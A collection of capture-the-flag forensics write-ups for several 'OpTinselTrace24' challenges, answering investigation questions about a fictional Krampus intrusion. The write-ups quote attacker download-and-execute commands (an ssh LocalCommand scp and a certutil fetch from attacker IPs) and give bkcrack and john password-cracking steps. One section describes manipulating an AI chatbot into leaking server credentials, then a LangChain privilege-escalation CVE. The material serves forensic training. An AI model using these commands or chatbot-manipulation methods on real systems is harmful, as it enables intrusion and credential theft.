# OpTinselTrace24-1: Sneaky Cookie

## Task 1

Q: Krampus, a notorious threat actor, possibly social-engineered bingle as email security filters were offline for maintenance. Find any suspicious files under Bingle Jollybeard User directory and get back to us with the full file name

`christmas_slab.pdf.lnk` - in Documents (added .lnk since it is a shortcut)

## Task 2

Q: Using the malicious file sent as part of phishing, the attacker abused a legitimate binary to download and execute a C&C stager. What is the full command used to download and execute the C&C Binary?

Get command line of the aforementioned lnk

`C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "StrictHostKeyChecking=no" -o "LocalCommand=scp root@17.43.12.31:/home/revenge/christmas-sale.exe c:\users\public\. && c:\users\public\christmas-sale.exe" revenge@17.43.12.31`

## Task 3

Q: When was this file ran on the system by the victim?

`2024-11-05 15:50:33` - get PEcmd from eric zimmerman and use it on the ssh.exe prefetch file

## Task 4

Q: What is the Mitre Sub technique ID for the technique used in Q1 and Q2 ?

`T1204.002` - tried a few, such as Phishing.Spearphishing file, CommandInterpreter.Powershell/WindowsCmd, but this one worked

## Task 5

Q: What was the name of threat actor's machine used to develop/create the malicious file sent as part of phishing?

`christmas-destr` - use LEcmd from EZ and use it on the LNK at the start

## Task 6

Q: When did attacker enumerated the running processes on the system?

`2024-11-05 15:52:30` - look through prefetch files and find tasklist, which can be used for listing processes, and run PEcmd on it

## Task 7

Q: After establishing a C&C Channel, attacker proceeded to abuse another Legitimate binary to download an exe file. What is the full URI for this download?

`http://13.233.149.250/candies/candydandy.exe` - there are a few programs that one can use to download stuff. After checking powershell and others, I ended up at the bits event logs, and found this.

## Task 8

Q: What is the Mitre ID for the technique used in Q7?

`T1197` - BITS techniques

## Task 9 

Q: In the workshop environment, RDP was only allowed internally. It is suspected that the threat actor stole the VPN configuration file for Bingle Jolly Beard, connected to the VPN, and then connected to Bingle's workstation via RDP. When did they first authenticate and successfully connect to Bingle's Workstation?

`2024-11-05 16:04:26` - TerminalService-RemoteConnectionManager-Operational event logs

## Task 10

Q: Any IOC's we find are critical to understand the scope of the incident. What is the hostname of attacker's machine making the RDP connection?

`XMAS-DESTROYER` - from the above log

## Task 11

Q: What is md5 hash of the file downloaded in Q7?

`e930b05efe23891d19bc354a4209be3e` - use AmcacheParser to parse Amcache files (Windows\\AppCompat) (they track metadata about executables and other files being run on the system), and get the sha-1 of candydandy.exe, paste it into VirusTotal and get the MD5

## Task 12

Q: Determine the total amount of traffic in KBs during the C&C control communication from the stager executable.

`541.286` - use SRU database (system resource usage) to get the network usages for christmas-sale.exe, sum the bytes received and sent and convert them to KB (not KiB)

## Task 13

Q: As part of persistence, the attacker added a new user account to the Workstation and granted them higher privileges. What is the name of this account?

`elfdesksupport` - lookup the newly created account in the security event logs, as event id 4720 (account creation)

## Task 14

Q: After completely compromising Bingle's workstation, the Attacker moved laterally to another system. What is the full username used to login to the system?

`northpole-nippy\nippy` - search security event logs event id (4648) - logon attempted with explicit credentials (I also tried event id 4624 - successfull logon with logon type 3 - network but that didn't get me anywhere), and try some of the odd values there

## Task 15

Q: According to the remote desktop event logs, what time did the attack successfully move laterally?

`2024-11-05 16:22:36` - check TerminalServices-RDPClient-Operational logs and see when it successfully connected

## Task 16

Q: After moving to the other system, the attacker downloaded an executable from an open directory hosted on their infrastructure. What are the two staging folders named?

`candies,sweets` - from using BMC tools to dump bitmaps from the RDP cache of the initial user, and using RDPCacheStitcher to look through the bitmaps

## Task 17

Q: What is the name of the downloaded executable downloaded from the open directory?

`cookies.exe` - same as above

## Task 18

Q: After downloading the executable from Q17, the attacker utilized the exe to be added as a persistence capability. What is the name they gave to this persistence task?

`christmaseve_gift` - same as above

## Task 19

Q: To further aid in internal reconnaissance, the threat actor downloads a well-known tool from the Vendor's website. What is the name of this tool?

`Advanced IP Scanner` - same as above

## Task 20

Q: Determine the total amount of traffic in KBs during the internal lateral movement, which originated from Bingle's workstation to the other machine in the network.

`16397.521` - in the sru cache, look for the RDP executable `mstsc` and get the total bytes from there


# OPTinselTrace24-2: Cookie Consumption

## Task 1

Q: How many replicas are configured for the flask-app deployment?

`3` - check default\\describes\\deployments.log

## Task 2

Q: What is the NodePort through which the flask-app is exposed?

`30000/TCP` - check default\\describes\\services.log to get the mapping of the internal port to the NodePort

## Task 3

Q: What time (UTC) did the attacker first initiate fuzzing on the /system/ endpoint?

`2024-11-08 22:02:48` - check default\\ and look in the logs of the flask app

## Task 4

Q: Which endpoint did the attacker discover through fuzzing and subsequently exploit?

`/system/execute` - search for 200 responses in the flask logs

## Task 5

Q: Which program did the attacker attempt to install to access their HTTP pages?

`curl` - from the same logs, check the /system/execute requests and see what they are installing

## Task 6

Q: What is the IP address of the attacker?

`10.129.231.112` - check host-processes.log for suspicious processes

## Task 7

Q: What is the name of the pod that was compromised and used by the attacker as the initial foothold?

`flask-app-77fbdcfcff-2tqgw` - put the name of the folder where you found the logs with the intrustion

## Task 8

Q: What is the name of the malicious pod created by the attacker?

`evil` - check the default\\alpine folder

## Task 9

Q: What is the absolute path of the backdoor file left behind by the attacker?

`/opt/backdoor.sh` - from cronjobs.txt


# OpTinselTrace24-3: Blizzard Breakdown

## Task 1

Q: The Victim Elf shared credentials that allowed the Rogue Elf to access the workstation. What was the Client ID that was shared?

`95192516` - after digging into the CloudTrail logs and some of the edge history, I've noticed in %LOCALAPPDATA% for the Lanny user that there's the IceChat Network folder, which has some logs from some IRC chat. Looking at the logs from the chats (the actual chats themselves), we get an interesting interaction with the W4yne user.

## Task 2

Q: What is the IP address of the Rogue Elf used during the attack?

`146.70.202.35` - from same log as above

## Task 3

Q: What is the name of the executable the victim ran to enable remote access to their system?

`AA_V3.EXE` - from the Edge DB for Lanny, I saw as downloads some AA_V3.exe file (`History` file), so I looked further, and saw in `urls` the amyy admin zero-config remote desktop, and thus tried it and it worked

## Task 4

Q: What time (UTC) did the Rogue Elf connect to the victim's workstation?

`2024-11-13 12:23:34` - get the date from the Ammyy logs, since we know this was used, but you'll have to fiddle with the timezone until you get it right

## Task 5

Q: The Rogue Elf compromised an AWS Access Key. What is the AWS Access Key ID obtained from the victim's workstation?

`AKIA52GPOBQCBFYGAYHI` - since we knew the key started with AK, I gathered all CloudTrail logs into one and searched for the key format (`AKIA[A-Z0-9]{16}` in the logs corresponding to similar times when the computer was compromised)

## Task 6

Q: Which S3 bucket did the Rogue Elf target during the incident?

`arctic-archive-freezer` - get bucket name from where that access key was used

## Task 7

Q: Within the targeted S3 bucket, what is the name of the main directory where the files were stored?

`Claus_Operation_Data` - get prefixes used in those accesses

## Task 8

Q: What time (UTC) did the Rogue Elf disable versioning for the S3 bucket?

`2024-11-13 15:31:15` - search for the PutBucketVersioning event, with the given key

## Task 9

Q: What is the MITRE ATT&CK Technique ID associated with the method used in Question 8?

`T1490` - search for disable versioning mitre and try the IDs there

## Task 10

Q: What time (UTC) was the first restore operation successfully initiated for the S3 objects?

`2024-11-13 15:43:49` - search for RestoreObject event and ensure there are no errors there (ensure the correct access key is used)

## Task 11

Q: Which retrieval option did the Rogue Elf use to restore the S3 objects?

`Expedited` - get the restore options from the same log as before

## Task 12

Q: What is the filename of the S3 object that the Rogue Elf attempted to delete?

`GiftList_Worldwide.csv` - search for DeleteObjects events (ensure the correct access key is used) and get the key from there

## Task 13

Q: What is the size (MB) of the S3 object that the Rogue Elf targeted in Question 12?

`152` - see that there are multiple GetObject requests for our file, and just sum those up and try multiples of 8 until one works

## Task 14

Q: The Rogue Elf uploaded corrupted files to the S3 bucket. What time (UTC) was the first object replaced during the attack?

`2024-11-13 16:10:03` - search for PutObject events (with the given key) and get the earliest occurence

## Task 15

Q: What storage class was used for the S3 objects to mimic the original settings and avoid suspicion?

`glacier` - look at the storage class used in the malicious PutObject event


# OpTinselTrace24-3: Neural Noel

## Task 1

Q: What username did the attacker query the AI chatbot to check for its existence?

`Juliet` - open the given PCAP, and filter for HTTP traffic (observe first that the chatbot talk is done via HTTP, and filter for that) to /rag-chatbot/

## Task 2

Q: What is the name of the AI chatbot that the attacker unsuccessfully attempted to manipulate into revealing data stored on its server?

`GDPR Chatbot` - check the result of the request to `/chat` for any chatbot, and look at the HTML returned, it has a list of all the chatbot names, and use the appropriate one based on the conversations there

## Task 3

Q: On which server technology is the AI chatbot running?

`Werkzeug/3.1.3 Python/3.12.7` - get user agent of requests

## Task 4

Q: Which AI chatbot disclosed to the attacker that it could assist in viewing webpage content and files stored on the server?

`Web & Files Chatbot` - same as in `task 2`

## Task 5

Q: Which file exposed user credentials to the attacker?

`creds.txt` - get the list of files from the `web & files chatbot` and see that we have `creds.txt` there

## Task 6

Q: What time did the attacker use the exposed credentials to log in?

`06:49:44` - get the username and password sent by the AI chatbot, and then check `auth.log` for the first successful login notification given that `noel` username

## Task 7

Q: Which CVE was exploited by the attacker to escalate privileges?

`CVE-2023-44467` - from `history`, we can assume that the AI is using `langchain 0.0.14`, thus we search for CVEs for that, and end up with this one, which is exactly matching our case, as it uses `__import__`

## Task 8

Q: Which function in the Python library led to the exploitation of the above vulnerability?

`__import__` - given the execution logs in `history` and the format of the answer, it was a fair guess

## Task 9

Q: What time did the attacker successfully execute commands with root privileges?

`06:56:41` - get this from `auth.log`, by seeing the first occurence of a shell spawned by `noel` that resulted in a `root` shell


# OpTinselTrace24-5: Tale of Maple Syrup


## Task 1

Q: Identifying IOCs, accounts, or infrastructure is crucial for detecting breaches by attackers. Determine the email address used by the threat actor so it can be added to Santa's threat intel feed.

`krampusevilson@yahoo.com` - do the second one first, and then search the databases in the app's folder, eventually one of them will give the email

## Task 2

Q: Which application was used by the insider threat to communicate with the threat actor? Please provide the application's Android package name.

`mega.privacy.android.app` - seems to be the only package with that given name hint

## Task 3

Q: When was this application installed on the device?

`2024-11-04 11:24:28` - last question I did, since the timestamps didn't match anything. I tried matching stuff from dbs and creation date of almost all files related to that app, but to no avail
I spent some time searching for some analysis tools, and ended up at `https://github.com/abrignoni/ALEAPP`
Running the tool gave some errors, but I looked at what it queried to get the installed app, and it looked at some `localappstate.db`, so I opened that and got the timestamp from there and it worked

## Task 4

Q: What is the agreed amount of money to be sent to the insider threat in exchange of him leaking Santa workshop's secrets?

`$69000` - check the messages from the email db

## Task 5

Q: Twinkle created a note on his phone using a note-keeping app. What were the contents of the note?

`I will need to find any ssh or rdp access that is open to internet. Will need to find their email address as well, maybe krampus will need those as well!!` - observe the `com.google.android.keep` package as the note-keeping app, and then search the databases in the databases folder 

## Task 6

Q: What is the title of this note?

`Collect Information` - search that same DB for other tables and get the title (`tree_entry` table)

## Task 7

Q: When was the note created in the note-keeping app?

`2024-11-04 12:14:55` - same table as before

## Task 8

Q: Twinkle Snowberry transferred a few files from his workstation to his mobile phone using an online file transfer service. What is the URL used to download the zip file on the mobile phone?

`https://eu.justbeamit.com:8443/download?token=um9w7` - check firefox databases related to downloads

## Task 9

Q: When was this file shared with the threat actor by the insider, Twinkle Snowberry?

`2024-11-05 12:04:24` - get timestamp of message from the initial DB

## Task 10

Q: Twinkle forgot the password of the archive file he sent to Krampus containing secrets. What was the password for the file?

`passdrow69#` - hah, this was hard
You'll have to pay attention to the encryption method that was used, namely ZipCrypto. I tried bruteforcing for a while with data from various databases from within the app, but to no avail. Then, I started searching for attacks against ZipCrypto, and ended up with this website: `https://blog.devolutions.net/2020/08/why-you-should-never-use-zipcrypto/` (talks about a known plaintext attack). This might work since we know part of the plaintext (we know the insider's email from the initial  DB, and we know that in that encrypted archive there's a list of emails, from that same convo). By creating a test plain.txt file with the known email (`TwinkleSnowberry@north.pole`), zipping it with ZipCrypto method and no password, then running `bkcrack.exe -C "info-send(1).zip" -c Emails.txt -P plain.zip -p plain.txt`, we get some keys. We can then recover the password via `bkcrack.exe -k cec26f80 cc8751a0 fdf67470 -r 11 ?p` or decrypt files from within with `bkcrack.exe -C "info-send(1).zip" -c Emails.txt -k cec26f80 cc8751a0 fdf67470 -d Emails.txt`.
 
## Task 11

Q: What is the master password of the KeePass database that was leaked by the insider threat and handed over to the evil Krampus?

`weed420` - run john on the decrypted .kdbx file with rockyou.txt

## Task 12

Q: What is the password for Santa's account on his North Pole workstation?

`IHaveToSaveChristmas!$` - browse the now decrypted keepass database and obtain the windows password

## Task 13

Q: Twinkle got his money in cryptocurrency so it can't be traced. Which cryptocurrency did he receive money in, and what was its address?

`Elfereum:LVg2kJoFNg45Nbpy53h7Fe1wKyeNJHeXV2` - from the initial DB with the email


# OpTinselTrace24-6: Sleigh Slayer


## Task 1

Q: What is the hostname from which the attacker laterally moved to Santa's computer?

`NORTHPOLE-TOYSQ` - search for event ID 4624 (successful logon) in Security.evtx, and look at the WorkstationName in the networking part (I used EvtxEcmd to parse all to csv and got all workstation names)

## Task 2

Q: When did Krampus log in to the machine?

`2024-12-10 10:38:58` - get the timestamp of that event

## Task 3

Q: The attacker navigated the file share in hopes of finding useful files. What is the file share path for something planned for Christmas Eve?

`\\NORTHPOLE-FS\fileshare\kitchen-prep\cristmas-eve-PRIORITY\` - looked into %APPDATA%\Microsoft\Windows\Recent and analyzed the shortcuts there, then found this

## Task 4

Q: When did the attacker visit this share?

`2024-12-10 10:41:40` - use shellbags for the santa user

## Task 5

Q: What is the filename of the file related to complaints from a department? The attacker found this on the share and also added it to the archive to exfiltrate.

`toys-dept.txt` - check other LNKs from the share location

## Task 6

Q: Windows Defender detected and stopped the first attempt of the attacker to download a file from their infrastructure. What is the full command that was executed by the attacker, which Defender detected and stopped?

`C:\Windows\System32\certutil.exe -urlcache -f http://3.110.162.216:8175/OpXmasDestroy/Collection/package.exe
` - check Windows Defender event logs

## Task 7

Q: The attacker proceeded to disable Windows real-time protection in order to evade defenses. When did this activity occur?

`2024-12-10 10:44:10` - from same logs as above

## Task 8

Q: The attacker copied a file and moved it from one location to another using 7zip. What is the full path where this file was moved to?

`C:\Users\Public\scan\` - from NTUSER.DAT registry hive, in 7z registry we have CopyHistory, which has this directory

## Task 9

Q: The attacker also enumerated a zip file using 7zip on Santa's desktop. What is the path of the folder related to the Christmas bonus present inside that zip?

`C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\performance_bonus_24\` - browse the same registry key as above and look at FolderHistory

## Task 10

Q: What was the name of the archive file created by 7zip?

`scan87x.zip` - from LNK in Recent files

## Task 11

Q: The attacker installed 7zip on the system and added some files to be archived. What was the last filesystem path visited by Krampus?

`C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration` - same registry key as Task 9, just get the first folder in that list

## Task 12

Q: The attacker downloaded installers from their infrastructure for data exfiltration and collection. What is the full download URL for the tool used for exfiltration?

`http://3.110.162.216:8175/OpXmasDestroy/exfil/Godzilla.exe` - check CryptnetUrlCache metadata files for URLs

## Task 13

Q: What is the name of the tool used for exfiltration?

`Filezilla` - check the content folder now for the same file name as you found in metadata from the task above

## Task 14

Q: The attacker renamed the zip before exfiltrating it. What was the name changed to?

`transfer_scanned.zip` - jumplists from AutomaticDestionations from Recent files, same place as the initial shortcuts, search for .zip files there and you'll get that one

## Task 15

Q: What is the set of credentials used by Krampus to exfiltrate data to his server?

`krampus:ihavetodestroychristmasxoxo` - lmao, did this first, I started looking through the data and noticed the filezilla data in %APPDATA% for the santa user, found a password so I looked for matching questions, and this was it

## Task 16

Q: Determine the full path where the files from Santa's computer were exfiltrated and stored on Krampus's server.

`/home/krampus/ChristmasOP/santaloot` - from filezilla logs in %APPDATA%

## Task 17

Q: Krampus then proceeded to download ransomware on the system. What is the SHA-256 hash of the executable?

`808f098b303d6143e317dd8dae9e67ac8d2bcb445427d221aa9ad838aa150de3` - do the URL first (task 18) and then get the file from Content

## Task 18

Q: What is the full download URL for the ransomware file?

`http://3.109.152.7/final_operation/destroyer.zip` - same as for the FileZilla, find the metadata file

## Task 19

Q: When was the ransomware binary executed according to prefetch?

`2024-12-10 11:06:30` - use PEcmd and get the last run time

## Task 20

Q: Reverse engineer the ransomware. What was the IV used for encryption?

`8d2bc3f0f69426gd` - so, by analyzing the EXE given, we see that it seems to be legitimate, and just a NodeJS runner for compiled code
thus, we shift our focus to the given .JSC file we have, I tried a bit to see how we can do it, and ended up with this project `https://github.com/suleram/View8`
so we use that to decompile the code and get some source code, and we can see that the key and iv are generated from a base64 string, which are then xorred with `C:/Users/Public/file.txt`, so just decode the base64 and xor it with the given string to get the actual key and IV

## Task 21

Q: What was the Key used for encryption?

`REtgV24bDB7xWYoMuypiBASMEaJbc59n` - this was hard, js shenanigans af
so, basically the length check for the key in the XOR function is off by one (it checks if ("j" < a1["length"]), instead of length - 1), and that makes it access 1 byte after the buffer, which is typically \x00
but then, the lookup table used initially has values starting from 1, and accessing it at 0 is another overflow, thus we get another \x00 possibly

I just had a simple XOR script and made it that when it is the length of the key (24), we xor with 0 instead of accessing out of bounds buffers.

## Task 22

Q: Decrypt the encrypted files and find the name of the extra naughty kid.

`Tenzin` - decrypt the naughty kids pdf (beware that the encrypted file is given in hex form, and you have to take those bytes and decrypt it, and then base64 decode)

## Task 23

Q: Decrypt the encrypted files and find the name of the employee getting a promotion and salary increment.

`SparkleSugarglow` - same as task 22

## Task 24

Q: When did the threat actor log off?

`2024-12-10 11:10:19` - search Security event logs and look for logoff events (4634, 4637)